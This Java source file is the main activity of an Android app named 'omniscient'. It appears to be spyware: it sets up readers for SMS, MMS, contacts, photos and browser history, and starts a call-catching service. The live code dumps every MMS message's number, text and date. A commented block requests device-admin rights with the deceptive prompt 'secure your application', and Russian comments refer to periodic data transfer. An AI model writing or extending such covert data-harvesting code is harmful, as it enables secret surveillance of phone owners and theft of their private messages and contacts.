package com.postal.omniscient;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;

import com.postal.omniscient.postal.adapter.AdapterData;
import com.postal.omniscient.postal.browser.history.BrowserHistory;
import com.postal.omniscient.postal.catchPhone.Call.TService;
import com.postal.omniscient.postal.reader.contact.ReadContacts;
import com.postal.omniscient.postal.reader.mms.ReadMms;
import com.postal.omniscient.postal.reader.sms.ReadSms;
import com.postal.omniscient.postal.reader.image.AllImages;

import java.text.SimpleDateFormat;
import java.util.Calendar;


public class MainActivity extends AppCompatActivity {
    private static String Msg = "MyMsg1";


    private static final int REQUEST_CODE = 0;
    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //CONTACTS
//        getContacts();//in test
        //SMS
        ReadSms ob = new ReadSms(getContentResolver());
        String uri_send_sms = "content://sms/sent";
        String uri_inbox_sms = "content://sms/inbox";
//        ob.massAllSMS(uri_send_sms, uri_inbox_sms); // SMS'ki



        //IMEGE
        AllImages img = new AllImages(getContentResolver());
        String DATE_COLUMN_NAME = "date_added > ? AND ?";
        Calendar currentDate = Calendar.getInstance();

        long start_date = 1453734849;// дата из БД последней удачной передачи данных
        long end_date = currentDate.getTimeInMillis();// текущаяя дата (/1000 потому что получаем полную дату 14 цыфр а в БД 10 цыфр

//        img.getAllImages(DATE_COLUMN_NAME, start_date, end_date); //для выборки по дате новых фото
//        img.getAllImages();

        //BROWSER
        BrowserHistory br_h = new BrowserHistory(getContentResolver());
//        br_h.getBrowserHist();

        //MMS
        ReadMms mms = new ReadMms(getContentResolver());
        Long buf_date;
        for(AdapterData buf : mms.massAllMms()){
            Log.i(Msg, "Id : "+buf.getId());
            Log.i(Msg, "Phone : "+buf.getAddress());
            Log.i(Msg, "Text : "+buf.getMsg());
            buf_date = Long.parseLong(buf.getTime());
            Log.i(Msg, "date : " + new SimpleDateFormat("dd/MM/yyyy HH:mm")
                    .format(buf_date*1000));
        }


//        PhoneCall phoneCall = new PhoneCall();
//        phoneCall.onReceive(getApplicationContext(),null);
        ////////////////////////////////////////////////////////////////////
//        try {
//            // Initiate DevicePolicyManager.
//            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
//            mAdminName = new ComponentName(this, DeviceAdminDemo.class);
//
//            if (!mDPM.isAdminActive(mAdminName)) {
//                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
//                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
//                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
//                startActivityForResult(intent, REQUEST_CODE);
//            } else {
//                 //mDPM.lockNow();
//                // Intent intent = new Intent(MainActivity.this,
//                // TrackDeviceService.class);
//                // startService(intent);
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
////////////////////////////////////////////////////////////////////////////
//        ReadMms mms = new ReadMms(getContentResolver());
//        String uri_send_mms = "content://mms";
//        String uri_inbox_mms = "content://mms/inbox";
//        mms.massAllMms();
//        mms.massAllMMS(uri_send_sms, uri_inbox_sms);
    }
    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (REQUEST_CODE == requestCode) {
            Intent intent = new Intent(MainActivity.this, TService.class);
            startService(intent);
        }
    }
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
    private void getContacts(){
        ReadContacts getPhones = new ReadContacts(getContentResolver());
        String [][] phone_contacts = getPhones.readContacts();

            for (int i=0; getPhones.getX()>i; i++) {
                if(phone_contacts[i][0]!=null) {
//                    Log.i(Msg, " ОТВЕТ размер1 - " + phone_contacts[i][0]);

                }

                for (int k=1; getPhones.getY()>k; k++) {
                    if (phone_contacts[i][k] != null) {
//                        Log.i(Msg, " ОТВЕТ размер2  - " + phone_contacts[i][k]);
                    }
                }

                }
            }

}
